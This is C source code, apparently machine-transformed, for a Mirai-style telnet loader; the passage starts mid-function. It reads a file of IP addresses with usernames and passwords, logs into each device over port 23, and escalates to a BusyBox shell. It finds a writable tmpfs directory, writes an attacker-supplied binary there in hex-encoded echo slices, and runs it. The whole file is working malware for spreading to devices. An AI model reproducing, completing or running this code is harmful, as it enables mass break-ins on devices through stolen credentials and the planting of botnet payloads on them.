              if ((unsigned long )tmp___4 != (unsigned long )((void *)0)) {
                state___0->got_prompt = (unsigned char)1;
                sockprintf(state___0->fd, (char *)"%s\r\n", state___0->username);
                state___0->state = (unsigned char)4;
                break;
              } else {
                tmp___5 = matchPrompt((char *)(buf));
                if (tmp___5) {
                  state___0->got_prompt = (unsigned char)1;
                  sockprintf(state___0->fd, (char *)"%s\r\n", state___0->username);
                  state___0->state = (unsigned char)4;
                  break;
                }
              }
            }
          }
        }
        if ((int )state___0->state == 4) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___6 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"assword",
                             7UL);
            if ((unsigned long )tmp___6 != (unsigned long )((void *)0)) {
              sockprintf(state___0->fd, (char *)"%s\r\n", state___0->password);
              state___0->state = (unsigned char)5;
              break;
            } else {
              tmp___7 = matchPrompt((char *)(buf));
              if (tmp___7) {
                sockprintf(state___0->fd, (char *)"%s\r\n", state___0->password);
                state___0->state = (unsigned char)5;
                break;
              }
            }
          }
        }
        if ((int )state___0->state == 5) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___8 = strcasestr((char const   *)(buf), "access denied");
            if ((unsigned long )tmp___8 != (unsigned long )((void *)0)) {
              state___0->state = (unsigned char)254;
              break;
            } else {
              tmp___9 = strcasestr((char const   *)(buf), "invalid password");
              if ((unsigned long )tmp___9 != (unsigned long )((void *)0)) {
                state___0->state = (unsigned char)254;
                break;
              } else {
                tmp___10 = strcasestr((char const   *)(buf), "login incorrect");
                if ((unsigned long )tmp___10 != (unsigned long )((void *)0)) {
                  state___0->state = (unsigned char)254;
                  break;
                } else {
                  tmp___11 = strcasestr((char const   *)(buf), "password is wrong");
                  if ((unsigned long )tmp___11 != (unsigned long )((void *)0)) {
                    state___0->state = (unsigned char)254;
                    break;
                  }
                }
              }
            }
            tmp___12 = strcasestr((char const   *)(buf), "BusyBox");
            if ((unsigned long )tmp___12 != (unsigned long )((void *)0)) {
              sockprintf(state___0->fd, (char *)"enable\r\n");
              state___0->state = (unsigned char)6;
              break;
            } else {
              tmp___13 = matchPrompt((char *)(buf));
              if (tmp___13) {
                sockprintf(state___0->fd, (char *)"enable\r\n");
                state___0->state = (unsigned char)6;
                break;
              }
            }
          }
        }
        if ((int )state___0->state == 6) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            sockprintf(state___0->fd, (char *)"shell\r\n");
            state___0->state = (unsigned char)7;
            break;
          }
        }
        if ((int )state___0->state == 7) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            sockprintf(state___0->fd, (char *)"sh\r\n");
            if ((int )state___0->special == 1) {
              state___0->state = (unsigned char)250;
            } else {
              state___0->state = (unsigned char)8;
            }
            break;
          }
        }
        if ((int )state___0->state == 8) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___14 = matchPrompt((char *)(buf));
            if (tmp___14) {
              sockprintf(state___0->fd, (char *)"%s\r\n", "/bin/busybox VDOSS");
              state___0->state = (unsigned char)9;
              break;
            }
          }
        }
        if ((int )state___0->state == 9) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___15 = strcasestr((char const   *)(buf), "applet not found");
            if ((unsigned long )tmp___15 != (unsigned long )((void *)0)) {
              tmp___16 = matchPrompt((char *)(buf));
              if (tmp___16) {
                sockprintf(state___0->fd, (char *)"cat /proc/mounts\r\n");
                state___0->state = (unsigned char)10;
                break;
              }
            }
          }
        }
        if ((int )state___0->state == 10) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___25 = strstr((char const   *)(buf), "tmpfs");
            if ((unsigned long )tmp___25 != (unsigned long )((void *)0)) {
              goto _L;
            } else {
              tmp___26 = strstr((char const   *)(buf), "ramfs");
              if ((unsigned long )tmp___26 != (unsigned long )((void *)0)) {
                _L: /* CIL Label */
                tmp_buf = (char *)(buf);
                start = (char *)((void *)0);
                space = (char *)((void *)0);
                memes = 0;
                while (1) {
                  tmp___20 = strstr((char const   *)tmp_buf, "tmpfs");
                  if ((unsigned long )tmp___20 != (unsigned long )((void *)0)) {
                    tmp___18 = strstr((char const   *)tmp_buf, "tmpfs");
                    start = tmp___18;
                  } else {
                    tmp___19 = strstr((char const   *)tmp_buf, "ramfs");
                    start = tmp___19;
                  }
                  space = strchr((char const   *)start, ' ');
                  if ((unsigned long )start != (unsigned long )tmp_buf) {
                    if ((int )*(start - 1) != 10) {
                      while (1) {
                        if ((unsigned long )start > (unsigned long )(buf)) {
                          if (! ((int )*start != 10)) {
                            break;
                          }
                        } else {
                          break;
                        }
                        start --;
                      }
                      if ((unsigned long )start == (unsigned long )(buf)) {
                        goto __Cont___0;
                      }
                      start ++;
                      space = strchr((char const   *)start, ' ');
                    }
                  }
                  if ((int )*(space + 1) == 47) {
                    iii = 1;
                    iii = 1;
                    while (1) {
                      if ((int )*(space + iii) == 0) {
                        break;
                      } else
                      if ((int )*(space + iii) == 32) {
                        break;
                      }
                      iii ++;
                    }
                    if (iii > 1) {
                      strncpy((char * __restrict  )(state___0->path[memes]), (char const   * __restrict  )(space + 1),
                              (size_t )(iii - 1));
                      state___0->path[memes][iii - 1] = (char )'\000';
                      memes ++;
                    }
                    space += iii;
                    if ((int )*(space + 0) != 0) {
                      iii = 1;
                      while (1) {
                        if ((int )*(space + iii) == 0) {
                          break;
                        } else
                        if ((int )*(space + iii) == 32) {
                          break;
                        }
                        iii ++;
                      }
                      space += iii;
                    } else {
                      break;
                    }
                  }
                  tmp_buf = space;
                  __Cont___0: /* CIL Label */
                  tmp___21 = strstr((char const   *)tmp_buf, "tmpfs");
                  if (! ((unsigned long )tmp___21 != (unsigned long )((void *)0))) {
                    tmp___22 = strstr((char const   *)tmp_buf, "ramfs");
                    if ((unsigned long )tmp___22 != (unsigned long )((void *)0)) {
                      if (! (memes < 5)) {
                        break;
                      }
                    } else {
                      break;
                    }
                  }
                }
                tmp___23 = strlen((char const   *)(state___0->path[0]));
                if (tmp___23 == 0UL) {
                  strcpy((char * __restrict  )(state___0->path[0]), (char const   * __restrict  )"/");
                }
                sockprintf(state___0->fd, (char *)"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n",
                           state___0->path[0], state___0->path[0], state___0->path[0]);
                state___0->state = (unsigned char)100;
                break;
              } else {
                tmp___24 = matchPrompt((char *)(buf));
                if (tmp___24) {
                  strcpy((char * __restrict  )(state___0->path[0]), (char const   * __restrict  )"/var/run");
                  sockprintf(state___0->fd, (char *)"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n",
                             state___0->path[0], state___0->path[0], state___0->path[0]);
                  state___0->state = (unsigned char)100;
                  break;
                }
              }
            }
          }
        }
        if ((int )state___0->state == 100) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___29 = strcasestr((char const   *)(buf), "applet not found");
            if ((unsigned long )tmp___29 != (unsigned long )((void *)0)) {
              sockprintf(state___0->fd, (char *)"/bin/busybox echo -ne \'\' > %s/a && /bin/busybox VDOSS\r\n",
                         state___0->path[state___0->pathInd]);
              state___0->state = (unsigned char)101;
              break;
            } else {
              tmp___28 = matchPrompt((char *)(buf));
              if (tmp___28) {
                state___0->pathInd = (uint8_t )((int )state___0->pathInd + 1);
                if ((int )state___0->pathInd == 5) {
                  strcpy((char * __restrict  )(state___0->path[0]), (char const   * __restrict  )"/var/run");
                  state___0->pathInd = (uint8_t )0;
                  sockprintf(state___0->fd, (char *)"/bin/busybox echo -ne \'\' > %s/a && /bin/busybox VDOSS\r\n",
                             state___0->path[state___0->pathInd]);
                  state___0->state = (unsigned char)101;
                  break;
                } else {
                  tmp___27 = strlen((char const   *)(state___0->path[state___0->pathInd]));
                  if (tmp___27 == 0UL) {
                    strcpy((char * __restrict  )(state___0->path[0]), (char const   * __restrict  )"/var/run");
                    state___0->pathInd = (uint8_t )0;
                    sockprintf(state___0->fd, (char *)"/bin/busybox echo -ne \'\' > %s/a && /bin/busybox VDOSS\r\n",
                               state___0->path[state___0->pathInd]);
                    state___0->state = (unsigned char)101;
                    break;
                  }
                }
                sockprintf(state___0->fd, (char *)"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n",
                           state___0->path[state___0->pathInd], state___0->path[state___0->pathInd],
                           state___0->path[state___0->pathInd]);
                break;
              }
            }
          }
        }
        if ((int )state___0->state == 101) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___31 = strcasestr((char const   *)(buf), "applet not found");
            if ((unsigned long )tmp___31 != (unsigned long )((void *)0)) {
              tmp___30 = state___0->echoInd;
              state___0->echoInd = (uint16_t )((int )state___0->echoInd + 1);
              sockprintf(state___0->fd, (char *)"/bin/busybox echo -ne %s >> %s/a && /bin/busybox VDOSS\r\n",
                         *(binary.slices + tmp___30), state___0->path[state___0->pathInd]);
              if ((int )state___0->echoInd == binary.num_slices) {
                state___0->state = (unsigned char)102;
              } else {
                state___0->state = (unsigned char)101;
              }
              break;
            }
          }
        }
        if ((int )state___0->state == 102) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___32 = strcasestr((char const   *)(buf), "applet not found");
            if ((unsigned long )tmp___32 != (unsigned long )((void *)0)) {
              sockprintf(state___0->fd, (char *)"%s/a %s; /bin/busybox VDOSS\r\n",
                         state___0->path[state___0->pathInd], run_arg);
              state___0->state = (unsigned char)103;
              break;
            }
          }
        }
        if ((int )state___0->state == 103) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___33 = strcasestr((char const   *)(buf), "applet not found");
            if ((unsigned long )tmp___33 != (unsigned long )((void *)0)) {
              state___0->state = (unsigned char)255;
              break;
            }
          }
        }
        if ((int )state___0->state == 250) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___34 = matchPrompt((char *)(buf));
            if (tmp___34) {
              sockprintf(state___0->fd, (char *)"show text /proc/self/environ\r\n");
              state___0->state = (unsigned char)251;
              break;
            }
          }
        }
        if ((int )state___0->state == 251) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___35 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000",
                              16UL);
            if ((unsigned long )tmp___35 != (unsigned long )((void *)0)) {
              sockprintf(state___0->fd, (char *)"export PS1=\"prompt>\"\r\n");
              state___0->state = (unsigned char)8;
              break;
            } else {
              tmp___36 = matchPrompt((char *)(buf));
              if (tmp___36) {
                sockprintf(state___0->fd, (char *)"export PS1=\"prompt>\"\r\n");
                state___0->state = (unsigned char)8;
                break;
              }
            }
          }
        }
        if ((int )state___0->state == 254) {
          closeAndCleanup(state___0->fd);
          is_closed = 1;
        }
        if ((int )state___0->state == 255) {
          if (state___0->success) {
            handle_found(state___0->fd);
          }
          closeAndCleanup(state___0->fd);
          is_closed = 1;
        }
        if (state___0->slotUsed) {
          if (old_state != (int )state___0->state) {
            updateAccessTime(state___0->fd);
          } else
          if ((int )state___0->state == 101) {
            updateAccessTime(state___0->fd);
          }
        }
        pthread_mutex_unlock(& state___0->mutex);
        if (! is_closed) {
          event.events = (uint32_t )0;
          event.data.ptr = (void *)0;
          event.data.fd = state___0->fd;
          event.events = 3221233665U;
          epoll_ctl(epollFD, 3, state___0->fd, & event);
        }
      } else
      if (pevents[i].events & 4U) {
        state___1 = & stateTable[pevents[i].data.fd];
        pthread_mutex_lock(& state___1->mutex);
        if ((int )state___1->state == 0) {
          so_error = 0;
          len = (socklen_t )sizeof(so_error);
          getsockopt(state___1->fd, 1, 4, (void * __restrict  )(& so_error), (socklen_t * __restrict  )(& len));
          if (so_error) {
            handle_failed_connect(state___1->fd);
            closeAndCleanup(state___1->fd);
            pthread_mutex_unlock(& state___1->mutex);
            i++;
            continue;
          }
          state___1->state = (unsigned char)1;
          pevents[i].events = 3221233665U;
          epoll_ctl(epollFD, 3, state___1->fd, & pevents[i]);
        } else {
          printf((char const   * __restrict  )"wrong state on connect epoll: %d\n",
                 state___1->fd);
          closeAndCleanup(state___1->fd);
        }
        pthread_mutex_unlock(& state___1->mutex);
      }
      __Cont___1: /* CIL Label */
      i ++;
    }
  }
  __sync_fetch_and_sub(& running_threads, 1);
  return ((void *)0);
}
}
void sighandler(int sig )
{


  {
  printf((char const   * __restrict  )"\nctrl-c\n");
  exit(0);
}
}
void chomp(char *s )
{


  {
  while (1) {
    if (*s) {
      if ((int )*s != 10) {
        if (! ((int )*s != 13)) {
          break;
        }
      } else {
        break;
      }
    } else {
      break;
    }
    s ++;
  }
  *s = (char)0;
  return;
}
}
void *loader(void *threadCount )
{
  char readmelolfgt[1024] ;
  char *pch ;
  char *running ;
  char *orig ;
  char *token ;
  int curTime ;
  time_t tmp ;
  int q ;
  int tmp___0 ;
  in_addr_t tmp___1 ;
  struct sockaddr_in dest_addr ;
  int fd ;
  struct sockaddr_in my_addr ;
  int *tmp___2 ;
  int tmp___3 ;
  int flag ;
  unsigned short volatile   tmp___4 ;
  int *tmp___5 ;
  int tmp___6 ;
  int res ;
  int *tmp___7 ;
  time_t tmp___8 ;
  struct epoll_event event ;
  char *tmp___9 ;
  int curTime___0 ;
  time_t tmp___10 ;
  int q___0 ;

  {
  memset((void *)(readmelolfgt), 0, (size_t )1024);
  pch = (char *)((void *)0);
  while (1) {
    tmp___9 = fgets((char * __restrict  )(readmelolfgt), 1024, (FILE * __restrict  )infd);
    if (! ((unsigned long )tmp___9 != (unsigned long )((void *)0))) {
      break;
    }
    while (1) {
      tmp___0 = getConnectedSockets();
      if (! (tmp___0 > maxConnectedSockets - 1)) {
        break;
      }
      tmp = time((time_t *)((void *)0));
      curTime = (int )tmp;
      q = 0;
      while ((unsigned int volatile   )q < maxFDSaw) {
        pthread_mutex_lock(& stateTable[q].mutex);
        if (stateTable[q].slotUsed) {
          if (curTime > stateTable[q].updatedAt + 60) {
            if (stateTable[q].reconnecting == 0) {
              if ((int )stateTable[q].state == 0) {
                handle_failed_connect(stateTable[q].fd);
              } else {
                handle_timeout(stateTable[q].fd);
              }
              closeAndCleanup(stateTable[q].fd);
            }
          }
        }
        pthread_mutex_unlock(& stateTable[q].mutex);
        q ++;
      }
      usleep((__useconds_t )1000000);
    }
    orig = strdup((char const   *)(readmelolfgt));
    running = orig;
    token = strsep((char ** __restrict  )(& running), (char const   * __restrict  )":");
    if ((unsigned long )token == (unsigned long )((void *)0)) {
      free((void *)orig);
      continue;
    } else {
      tmp___1 = inet_addr((char const   *)token);
      if (tmp___1 == 4294967295U) {
        free((void *)orig);
        continue;
      }
    }
    dest_addr.sin_family = (sa_family_t )0;
    dest_addr.sin_port = (unsigned short)0;
    dest_addr.sin_addr.s_addr = 0U;
    dest_addr.sin_zero[0] = (unsigned char)0;
    dest_addr.sin_zero[1] = (unsigned char)0;
    dest_addr.sin_zero[2] = (unsigned char)0;
    dest_addr.sin_zero[3] = (unsigned char)0;
    dest_addr.sin_zero[4] = (unsigned char)0;
    dest_addr.sin_zero[5] = (unsigned char)0;
    dest_addr.sin_zero[6] = (unsigned char)0;
    dest_addr.sin_zero[7] = (unsigned char)0;
    memset((void *)(& dest_addr), 0, sizeof(struct sockaddr_in ));
    dest_addr.sin_family = (sa_family_t )2;
    dest_addr.sin_port = htons((uint16_t )23);
    dest_addr.sin_addr.s_addr = inet_addr((char const   *)token);
    fd = 0;
    my_addr.sin_family = (sa_family_t )0;
    my_addr.sin_port = (unsigned short)0;
    my_addr.sin_addr.s_addr = 0U;
    my_addr.sin_zero[0] = (unsigned char)0;
    my_addr.sin_zero[1] = (unsigned char)0;
    my_addr.sin_zero[2] = (unsigned char)0;
    my_addr.sin_zero[3] = (unsigned char)0;
    my_addr.sin_zero[4] = (unsigned char)0;
    my_addr.sin_zero[5] = (unsigned char)0;
    my_addr.sin_zero[6] = (unsigned char)0;
    my_addr.sin_zero[7] = (unsigned char)0;
    while (1) {
      tmp___2 = __errno_location();
      if (*tmp___2 != 9) {
        if (fd > 0) {
          close(fd);
        }
      }
      fd = 0;
      fd = socket(2, 1, 6);
      if (fd < 0) {
        perror("cant open socket");
        exit(-1);
      }
      tmp___3 = fcntl(fd, 3, (void *)0);
      fcntl(fd, 4, tmp___3 | 2048);
      flag = 1;
      setsockopt(fd, 6, 1, (void const   *)((char *)(& flag)), (socklen_t )sizeof(int ));
      memset((void *)(& my_addr), 0, sizeof(struct sockaddr_in ));
      my_addr.sin_addr.s_addr = inet_addr((char const   *)bind_ip);
      tmp___4 = port;
      port = (unsigned short volatile   )((int volatile   )port + (int volatile   )1);
      my_addr.sin_port = htons((uint16_t )tmp___4);
      my_addr.sin_family = (sa_family_t )2;
      tmp___5 = __errno_location();
      *tmp___5 = 0;
      tmp___6 = bind(fd, (struct sockaddr  const  * __restrict  )((struct sockaddr *)(& my_addr)),
                     (socklen_t )sizeof(my_addr));
      if (! (tmp___6 != 0)) {
        break;
      }
    }
    printf((char const   * __restrict  )"bound\n");
    res = 0;
    res = connect(fd, (struct sockaddr  const  * __restrict  )((struct sockaddr *)(& dest_addr)),
                  (socklen_t )sizeof(dest_addr));
    if (res < 0) {
      tmp___7 = __errno_location();
      if (*tmp___7 != 115) {
        close(fd);
        continue;
      }
    }
    if ((unsigned int volatile   )fd > maxFDSaw) {
      maxFDSaw = (unsigned int volatile   )(fd + 1);
    }
    pthread_mutex_lock(& stateTable[fd].mutex);
    if (! stateTable[fd].slotUsed) {
      printf((char const   * __restrict  )"memes\n");
      stateTable[fd].fd = fd;
      tmp___8 = time((time_t *)((void *)0));
      stateTable[fd].updatedAt = (int )tmp___8;
      stateTable[fd].slotUsed = 1;
      stateTable[fd].state = (unsigned char)0;
      stateTable[fd].is_open = (unsigned char)1;
      stateTable[fd].special = (unsigned char)0;
      token = strsep((char ** __restrict  )(& running), (char const   * __restrict  )":");
      strcpy((char * __restrict  )(stateTable[fd].username), (char const   * __restrict  )token);
      token = strsep((char ** __restrict  )(& running), (char const   * __restrict  )":");
      strcpy((char * __restrict  )(stateTable[fd].password), (char const   * __restrict  )token);
    } else {
      printf((char const   * __restrict  )"used slot found in loader thread?\n");
    }
    pthread_mutex_unlock(& stateTable[fd].mutex);
    event.events = (uint32_t )0;
    event.data.ptr = (void *)0;
    event.data.fd = fd;
    event.events = 3221233668U;
    epoll_ctl(epollFD, 1, fd, & event);
    free((void *)orig);
  }
  printf((char const   * __restrict  )"done reading input file.\n");
  while (1) {
    tmp___10 = time((time_t *)((void *)0));
    curTime___0 = (int )tmp___10;
    q___0 = 0;
    while ((unsigned int volatile   )q___0 < maxFDSaw) {
      pthread_mutex_lock(& stateTable[q___0].mutex);
      if (stateTable[q___0].slotUsed) {
        if (curTime___0 > stateTable[q___0].updatedAt + 60) {
          if (stateTable[q___0].reconnecting == 0) {
            if ((int )stateTable[q___0].state == 0) {
              handle_failed_connect(stateTable[q___0].fd);
            } else {
              handle_timeout(stateTable[q___0].fd);
            }
            closeAndCleanup(stateTable[q___0].fd);
          }
        }
      }
      pthread_mutex_unlock(& stateTable[q___0].mutex);
      q___0 ++;
    }
    sleep(1U);
  }
  close(epollFD);
}
}
extern int ( /* missing proto */  ceil)() ;
int load_binary(char *path )
{
  int fd ;
  int size ;
  int got ;
  int i ;
  int slice ;
  unsigned char ch ;
  ssize_t tmp ;
  void *tmp___0 ;
  void *tmp___1 ;
  ssize_t tmp___2 ;
  size_t tmp___3 ;

  {
  size = 0;
  got = 0;
  slice = 0;
  fd = open((char const   *)path, 0);
  if (fd == -1) {
    return (-1);
  }
  while (1) {
    tmp = read(fd, (void *)(& ch), (size_t )1);
    got = (int )tmp;
    if (! (got > 0)) {
      break;
    }
    size ++;
  }
  close(fd);
  binary.num_slices = ceil((double )((float )size / (float )128));
  tmp___0 = calloc((size_t )binary.num_slices, sizeof(unsigned char *));
  binary.slices = (unsigned char **)tmp___0;
  if ((unsigned long )binary.slices == (unsigned long )((void *)0)) {
    return (-1);
  }
  i = 0;
  while (i < binary.num_slices) {
    tmp___1 = calloc((size_t )1, (size_t )641);
    *(binary.slices + i) = (unsigned char *)tmp___1;
    if ((unsigned long )*(binary.slices + i) == (unsigned long )((void *)0)) {
      return (-1);
    }
    i ++;
  }
  fd = open((char const   *)path, 0);
  if (fd == -1) {
    return (-1);
  }
  while (1) {
    i = 0;
    while (i < 128) {
      tmp___2 = read(fd, (void *)(& ch), (size_t )1);
      got = (int )tmp___2;
      if (got != 1) {
        break;
      }
      tmp___3 = strlen((char const   *)*(binary.slices + slice));
      sprintf((char * __restrict  )(*(binary.slices + slice) + tmp___3), (char const   * __restrict  )"\\\\x%02X",
              (int )ch);
      i ++;
    }
    slice ++;
    if (! (got > 0)) {
      break;
    }
  }
  close(fd);
  return (0);
}
}
int main(int argc , char **argv )
{
  int threads ;
  int tmp ;
  int i ;
  pthread_t thread ;
  char timeText[100] ;
  time_t now ;
  time_t tmp___0 ;
  struct tm *t ;
  struct tm *tmp___1 ;
  char temp[17] ;
  unsigned int tmp___2 ;
  char *new ;
  void *tmp___3 ;
  int tmp___4 ;
  int tmp___5 ;

  {
  if (argc < 4) {
    fprintf((FILE * __restrict  )stderr, (char const   * __restrict  )"Invalid parameters!\n");
    fprintf((FILE * __restrict  )stdout, (char const   * __restrict  )"Usage: %s <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)\n",
            *(argv + 0));
    exit(-1);
  }
  signal(13, (void (*)(int  ))1);
  epollFD = epoll_create(57005);
  bind_ip = *(argv + 1);
  infd = fopen((char const   * __restrict  )*(argv + 2), (char const   * __restrict  )"r");
  signal(2, & sighandler);
  tmp = atoi((char const   *)*(argv + 5));
  threads = tmp;
  maxConnectedSockets = atoi((char const   *)*(argv + 6));
  if (argc == 8) {
    debug_mode = (unsigned char)1;
  }
  i = 0;
  while (i < 1) {
    pthread_mutex_init(& stateTable[i].mutex, (pthread_mutexattr_t const   *)((void *)0));
    i ++;
  }
  load_binary(*(argv + 3));
  run_arg = *(argv + 4);
  pthread_create((pthread_t * __restrict  )(& thread), (pthread_attr_t const   * __restrict  )((void *)0),
                 & loader, (void * __restrict  )((void *)(& threads)));
  i = 0;
  while (i < threads) {
    pthread_create((pthread_t * __restrict  )(& thread), (pthread_attr_t const   * __restrict  )((void *)0),
                   & flood, (void * __restrict  )((void *)0));
    i ++;
  }
  tmp___0 = time((time_t *)((void *)0));
  now = tmp___0;
  tmp___1 = localtime((time_t const   *)(& now));
  t = tmp___1;
  strftime((char * __restrict  )(timeText), sizeof(timeText) - 1UL, (char const   * __restrict  )"%d %b %Y %l:%M %p %Z",
           (struct tm  const  * __restrict  )t);
  printf((char const   * __restrict  )"Starting Scan at %s\n", timeText);
  temp[0] = (char)0;
  tmp___2 = 1U;
  while (! (tmp___2 >= 17U)) {
    temp[tmp___2] = (char)0;
    tmp___2 ++;
  }
  memset((void *)(temp), 0, (size_t )17);
  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Loaded");
  printf((char const   * __restrict  )"%-16s", temp);
  memset((void *)(temp), 0, (size_t )17);
  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"State Timeout");
  printf((char const   * __restrict  )"%-16s", temp);
  memset((void *)(temp), 0, (size_t )17);
  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"No Connect");
  printf((char const   * __restrict  )"%-16s", temp);
  memset((void *)(temp), 0, (size_t )17);
  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Closed Us");
  printf((char const   * __restrict  )"%-16s", temp);
  memset((void *)(temp), 0, (size_t )17);
  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Logins Tried");
  printf((char const   * __restrict  )"%-16s", temp);
  memset((void *)(temp), 0, (size_t )17);
  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"B/s");
  printf((char const   * __restrict  )"%-16s", temp);
  memset((void *)(temp), 0, (size_t )17);
  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Connected");
  printf((char const   * __restrict  )"%-16s", temp);
  memset((void *)(temp), 0, (size_t )17);
  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Running Thrds");
  printf((char const   * __restrict  )"%s", temp);
  printf((char const   * __restrict  )"\n");
  sleep(1U);
  tmp___3 = malloc((size_t )96);
  new = (char *)tmp___3;
  while (1) {
    if (debug_mode) {
      tmp___5 = 1;
    } else {
      tmp___5 = running_threads > (int volatile   )0;
    }
    if (! tmp___5) {
      break;
    }
    printf((char const   * __restrict  )"\r");
    memset((void *)new, '\000', (size_t )96);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            found_srvs);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            timed_out);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            failed_connect);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            remote_hangup);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            login_done);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15d", new,
            bytes_sent);
    tmp___4 = getConnectedSockets();
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            tmp___4);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15d", new,
            running_threads);
    printf((char const   * __restrict  )"%s", new);
    fflush(stdout);
    bytes_sent = (unsigned int volatile   )0;
    sleep(1U);
  }
  printf((char const   * __restrict  )"\n");
  now = time((time_t *)((void *)0));
  t = localtime((time_t const   *)(& now));
  strftime((char * __restrict  )(timeText), sizeof(timeText) - 1UL, (char const   * __restrict  )"%d %b %Y %l:%M %p %Z",
           (struct tm  const  * __restrict  )t);
  printf((char const   * __restrict  )"Scan finished at %s\n", timeText);
  return (0);
}
}
